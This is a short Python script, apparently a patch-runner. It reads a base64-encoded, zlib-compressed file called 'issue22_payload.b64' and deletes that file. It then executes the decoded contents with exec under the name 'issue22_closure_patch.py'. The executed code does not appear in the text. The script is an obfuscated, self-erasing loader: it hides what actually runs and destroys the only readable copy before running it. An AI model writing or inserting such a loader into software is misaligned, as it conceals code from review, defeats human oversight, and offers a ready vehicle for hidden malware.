from __future__ import annotations

import base64
from pathlib import Path
import zlib

payload_path = Path(__file__).with_name("issue22_payload.b64")
encoded = payload_path.read_text(encoding="ascii")
payload_path.unlink()
source = zlib.decompress(base64.b64decode(encoded)).decode("utf-8")
exec(compile(source, "issue22_closure_patch.py", "exec"))
